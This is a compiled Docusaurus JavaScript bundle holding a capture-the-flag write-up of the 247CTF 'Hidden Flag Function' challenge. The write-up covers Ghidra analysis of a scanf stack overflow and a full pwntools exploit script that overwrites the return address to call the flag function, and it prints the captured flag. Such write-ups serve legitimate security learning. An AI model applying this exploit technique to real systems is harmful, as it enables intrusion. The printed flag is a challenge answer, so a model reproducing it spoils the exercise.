"use strict";(self.webpackChunkchristopher_nguyen_re=self.webpackChunkchristopher_nguyen_re||[]).push([[9040],{3905:function(e,t,n){n.d(t,{Zo:function(){return f},kt:function(){return p}});var a=n(7294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,o=function(e,t){if(null==e)return{};var n,a,o={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var c=a.createContext({}),s=function(e){var t=a.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},f=function(e){var t=s(e.components);return a.createElement(c.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},u=a.forwardRef((function(e,t){var n=e.components,o=e.mdxType,r=e.originalType,c=e.parentName,f=l(e,["components","mdxType","originalType","parentName"]),u=s(n),p=o,h=u["".concat(c,".").concat(p)]||u[p]||d[p]||r;return n?a.createElement(h,i(i({ref:t},f),{},{components:n})):a.createElement(h,i({ref:t},f))}));function p(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var r=n.length,i=new Array(r);i[0]=u;var l={};for(var c in t)hasOwnProperty.call(t,c)&&(l[c]=t[c]);l.originalType=e,l.mdxType="string"==typeof e?e:o,i[1]=l;for(var s=2;s<r;s++)i[s]=n[s];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}u.displayName="MDXCreateElement"},5126:function(e,t,n){n.r(t),n.d(t,{assets:function(){return f},contentTitle:function(){return c},default:function(){return p},frontMatter:function(){return l},metadata:function(){return s},toc:function(){return d}});var a=n(7462),o=n(3366),r=(n(7294),n(3905)),i=["components"],l={slug:"hidden_flag_function",title:"Hidden Flag Function",authors:["nguyen"],tags:["CTF","Binary Exploitation","247ctf"]},c=void 0,s={permalink:"/blog/hidden_flag_function",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-02-08-hidden_flag_function.md",source:"@site/blog/2022-02-08-hidden_flag_function.md",title:"Hidden Flag Function",description:"247CTF: Hidden Flag Function",date:"2022-02-08T00:00:00.000Z",formattedDate:"February 8, 2022",tags:[{label:"CTF",permalink:"/blog/tags/ctf"},{label:"Binary Exploitation",permalink:"/blog/tags/binary-exploitation"},{label:"247ctf",permalink:"/blog/tags/247-ctf"}],readingTime:2.67,truncated:!0,authors:[{name:"Christopher Nguyen",title:"Reverse Engineer",url:"https://github.com/christopher-nguyen-re",imageURL:"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg",key:"nguyen"}],frontMatter:{slug:"hidden_flag_function",title:"Hidden Flag Function",authors:["nguyen"],tags:["CTF","Binary Exploitation","247ctf"]},prevItem:{title:"Stonks",permalink:"/blog/stonks"},nextItem:{title:"Level 0",permalink:"/blog/level-0"}},f={authorsImageUrls:[void 0]},d=[{value:"The Challenge",id:"the-challenge",level:2},{value:"Analysis",id:"analysis",level:2},{value:"The Solve",id:"the-solve",level:2}],u={toc:d};function p(e){var t=e.components,l=(0,o.Z)(e,i);return(0,r.kt)("wrapper",(0,a.Z)({},u,l,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("p",null,"247CTF: Hidden Flag Function"),(0,r.kt)("h2",{id:"the-challenge"},"The Challenge"),(0,r.kt)("p",null,"This challenge can be found ",(0,r.kt)("a",{parentName:"p",href:"https://247ctf.com/dashboard"},"here"),"."),(0,r.kt)("p",null,"Given an application, the goal is to gain control of the application flow and gain access to the hidden flag function."),(0,r.kt)("h2",{id:"analysis"},"Analysis"),(0,r.kt)("p",null,"I plugged the provided program into Ghidra and looked at the function call graph. I started from _start() and then looked into the main function."),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Main function",src:n(1010).Z,width:"496",height:"280"})),(0,r.kt)("p",null,"The function ",(0,r.kt)("inlineCode",{parentName:"p"},"chall")," takes user input by using scanf and stores it into a 68 byte buffer before returning. After some more digging, I find a function called flag."),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Flag function",src:n(9723).Z,width:"477",height:"245"})),(0,r.kt)("p",null,"The scanf command from chall was a point of interest as I would have been able to overwrite the address stored in the return from function. I wanted the return to execute the flag function and get the flag."),(0,r.kt)("p",null,"I ran the ",(0,r.kt)("inlineCode",{parentName:"p"},"file")," command on the executable and found that it was 32 bit little endian. It did not state that the program was a position independent executable. I needed to install i386 architecture as I could not run it natively on my ubuntu 64 bit system."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"sudo dpkg --add-architecture i386\nsudo apt-get update\nsudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386\n")),(0,r.kt)("p",null,"I also set core_pattern in /proc/sys/kernel to output coredumps to a file named core. This is needed in order to help with determining offsets within the executable."),(0,r.kt)("h2",{id:"the-solve"},"The Solve"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\n\nexe = ELF(\"./hidden_flag_function\")\n\ncontext.binary = exe\ncontext.log_level = 'info'\ncontext.terminal = ['gnome-terminal', '-e']\n\nCYCLIC_BYTES = 1000\n\ndef conn():\n    '''Establish the connection to the process, local or remote.\n    '''\n\n    if args.get('REMOTE'):\n        io = remote('40b14b3351586e58.247ctf.com', 50175)\n\n    else:\n        io = process([exe.path])\n\n    return io\n\n\ndef main():\n    '''Return the flag.\n    '''\n\n    offset = get_offset()\n    send_payload(offset)\n\n\ndef get_offset():\n    '''Get the offset'''\n\n    if args.get('REMOTE'):\n        return 76\n\n    with conn() as io:\n        pat = cyclic(CYCLIC_BYTES, n=4)\n        io.sendlineafter(b\"What do you have to say?\", pat)\n        # Program will crash and output coredump\n        io.wait()\n        core = io.corefile\n        offset_addr = core.fault_addr\n        log.info(f\"ADDR:{offset_addr}\")\n\n        offset = cyclic_find(offset_addr, n=4)\n        log.info(f\"OFFSET:{offset}\")\n        return offset\n\n\ndef send_payload(offset):\n    '''Send offset payload with flag function address'''\n    with conn() as io:\n        flag_func = p32(exe.symbols['flag'], endian='little')\n        log.info(f\"{flag_func}\")\n        payload = fit({\n            offset:flag_func\n        })\n\n        io.sendlineafter(b\"What do you have to say?\", payload)\n        io.interactive()\n\nif __name__ == '__main__':\n    main()\n")),(0,r.kt)("p",null,"First, I wanted to determine where the offset of scanf within the chall function was within the program. With the script above, I sent 1000 bytes using the cyclic pattern and attempted to crash the program. I parse the coredump for the address that caused the executable to crash. The executable will have crashed because chall's return address will have been overwritten. Chall's function stack is 76 bytes, consisting of the 68 byte array, the 4 byte FILE pointer, and the 4 byte stack pointer. The return address will be overwritten to be a subsequence of the pattern I sent with the usage of ",(0,r.kt)("inlineCode",{parentName:"p"},"cyclic"),". Using ",(0,r.kt)("inlineCode",{parentName:"p"},"cyclic_find"),", we find that the offset is 76 which matches what was expected."),(0,r.kt)("p",null,"Now that I had the offset, I needed to determine the flag function's address. This can be done by looking up the flag symbol with pwnlib.elf.elf. The address obtained is packed in little endian with the offset and sent."),(0,r.kt)("p",null,"Sending this payload to the server gets me the flag '247CTF{b1c2cb7d5a43939f8dc73369ec2dd59d}'."))}p.isMDXComponent=!0},9723:function(e,t,n){t.Z=n.p+"assets/images/hidden_flag_function_flag-a6516f5c6452eb0c8e48e5130ba75a22.png"},1010:function(e,t,n){t.Z=n.p+"assets/images/hidden_flag_function_main-0b0a478d4c5be92af4313f3336cd79be.png"}}]);